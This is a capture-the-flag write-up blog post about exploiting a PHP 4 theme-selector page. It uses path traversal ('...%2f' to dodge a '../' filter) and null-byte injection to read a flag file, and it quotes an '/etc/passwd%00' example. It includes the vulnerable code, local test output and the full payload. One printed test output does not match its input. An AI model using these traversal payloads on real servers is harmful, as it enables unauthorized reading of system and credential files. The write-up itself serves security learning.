---
layout: /src/layouts/MarkdownPostLayout.astro
title: Path Traversal Challenge
author: perfumo
description: "In this article I will show you a basic path traversal vulnerability I've found in a CTF challenge."
pubDate: 2022-03-09
tags: ["blog", "CTF"]
image:
  url: "/images/posts/path-traversal-ctf.webp"
  alt: "Path Traversal Challenge"
languages: ["html", "css", "php"]
---

In this article I will show you a basic "path traversal" vulnerability I've found in a CTF challenge.

## Description

A **simple website** that allows you to choose between **light**, **dark** and... nah, just these two. 
_P.S. PHP version 4_

## Code:

```php 
<?php
if(!isset($_GET["tema"])) $path = "light.css";  // Default
else {
    $path = $_GET["tema"];
    if (preg_match("/..\//", $path)) { 
        $path = str_replace('../', './' , $path);
        $error = false;
        $arr = explode(".", $path);
        $estensione = $arr[count($arr)-1];

        if($estensione != "css"){
            $error = true;
            $path = substr($path, 0, -3) . "css";
        }
    }
}
$css = "static/css/" . $path;
?>

<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>L/D</title>

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">

    <style>
        <?php echo file_get_contents($css); ?>
    </style>

    <!-- Bootstrap JavaScript -->
    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
  </head>

  <body>
    <div class="text-center my-3">
        <h1>Selettore di tema: Light & Dark</h1>
        <p class="pt-3" style="font-size:23;">
            <i>Hai mai sognato di poter cambiare il tema con un semplice click? Finalmente puoi!</i>
        </p>
    </div>

    <div class="row mt-5 w-100">
        <div class="col-2 col-md-4"> </div>
        <div class="col text-center">
            <button class="p-2" onclick="window.location.href='index.php?tema=light.css'">Tema chiaro</button>
        </div>
        <div class="col text-center">
            <button class="p-2" onclick="window.location.href='index.php?tema=dark.css'">Tema scuro</button>
        </div>
        <div class="col-2 col-md-4"> </div>
    </div>

    <div class="error mt-5 text-center">
        <?php if($error) echo "<img src='static/img/zeb.jpg' style='width: 50vw;'/>"; ?>
    </div>

  </body>
</html>
```
## Code breakdown

This page takes a **GET request** with the name of the stylesheet so you can choose from dark and light mode.

```php
if(!isset($_GET["tema"])) $path = "light.css";  // Default
else {
    $path = $_GET["tema"];    
```

### The Filters

Here is the interesting part, we found two filters and we can assume that they prevent a **Path Traversal Vulnerability**.

```php
if (preg_match("/..\//", $path)) { 
        $path = str_replace('../', './' , $path); //changes ../ to ./
        $error = false;
        $arr = explode(".", $path);
        $estensione = $arr[count($arr)-1];   

        if($estensione != "css"){  //checks if the file extension is .css
            $error = true;
            $path = substr($path, 0, -3) . "css";
        }
    }
```

## Hacking the filters

Now we need to find somewhere a flag.txt file... let's try to find a wokaround to **The Filters**.

### First Filter - the Regex

The regex in the if statment detects every ```..```, ```/```, ```\``` and ```../``` characters, then it replace every ```../ ``` with ```./```.<br /><br />
We need to encode our payload to fool the parser, we can try with **%2f**, the url uncoded version of ```/```. <br /><br />For the ".." part we need to be more creative... <br /><br />yeah that's it! Wait you didn't get it? it's literally ```...```    :0<br />

Let's try and see if it works! I'll run a local test with some  ```php echo(); ```

```php

    $path = $_GET["tema"];
    echo('payload:  '.$path);


    if (preg_match("/..\//", $path)) { 
            $path = str_replace('../', './' , $path); //changes ../ to ./
            $error = false;

            echo("after regex:  " . $path);

            $arr = explode(".", $path);
            $estensione = $arr[count($arr)-1];   

            if($estensione != "css"){  //checks if the file extension is .css
                $error = true;
                $path = substr($path, 0, -3) . "css";
            }
        }

/*

    Input:
        ...%2f...%2fflag
    Output:
        payload: .../.../flag
        after regex:   ../../flag
*/

 ```

And it works!

### Second Filter
Ok so, now we have to change our file extension to .css if we want to pass this filter... or we have to?<br /><br />
We get a little hint in the description: **_P.s. PHP version 4_**... PHP 4 has a huge hole in it, the **Null Byte Injection**.
<br/>
Here's an example:

 ```php

<?php
    $file = $_GET['file']; // "../../etc/passwd%00"
    if (file_exists('/home/wwwrun/'.$file.'.php')) {
        // file_exists will return true as the file /home/wwwrun/../../etc/passwd exists
        include '/home/wwwrun/'.$file.'.php';
        // the file /etc/passwd will be included
    }
?>
```
You can find this example and why it works [here](https://www.php.net/manual/en/security.filesystem.nullbytes.php).
<br/>
Now Let's try a payload in our local test environment:

```php

    $path = $_GET["tema"];
    echo('payload:  '.$path);

    if (preg_match("/..\//", $path)) { 
        $path = str_replace('../', './' , $path);
        $error = false;
        
        echo("after regex:  " . $path);

        $arr = explode(".", $path);
        $estensione = $arr[count($arr)-1];

        if($estensione != "css"){
            $error = true;
            $path = substr($path, 0, -3) . "css";
        }
    }
}

$css = "static/css/" . $path;
echo('final path:  ' . $css);

/*

    Input:
        ...%2f...%2fflag.txt%00.css
    Output:
        payload: .../.../flag
        after regex:   ../../flag
        final path:  static/css/../../flag.txt.css 
*/

 ```


Now let's combine all and try it on the server with some random ```../ ```<br /><br />

payload: ```...%2f...%2f...%2f...%2f...%2fflag.txt%00.css ```<br /><br />

## Response

```php
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Content-Length: 1927
Content-Type: text/html
Date: Wed, 09 Mar 2022 16:46:19 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding
X-Powered-By: PHP/4.4.0
Connection: close

<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>L/D</title>

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">

    <style>
        flag{l1ght_1s_f0r_n00bs_d4rk_1s_f0r_h4ck3rs}    </style>

    <!-- Bootstrap JavaScript -->
    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
  </head>

  <body>
    <div class="text-center my-3">
        <h1>Selettore di tema: Light & Dark</h1>
        <p class="pt-3" style="font-size:23;">
            <i>Hai mai sognato di poter cambiare il tema con un semplice click? Finalmente puoi!</i>
        </p>
    </div>

    <div class="row mt-5 w-100">
        <div class="col-2 col-md-4"> </div>
        <div class="col text-center">
            <button class="p-2" onclick="window.location.href='index.php?tema=light.css'">Tema chiaro</button>
        </div>
        <div class="col text-center">
            <button class="p-2" onclick="window.location.href='index.php?tema=dark.css'">Tema scuro</button>
        </div>
        <div class="col-2 col-md-4"> </div>
    </div>

    <div class="error mt-5 text-center">
            </div>

  </body>
</html>
```

Ha ha you fool! It works!
<br /><br />

<center>
<img src="https://i.redd.it/8kee97gbycw11.png">
</center>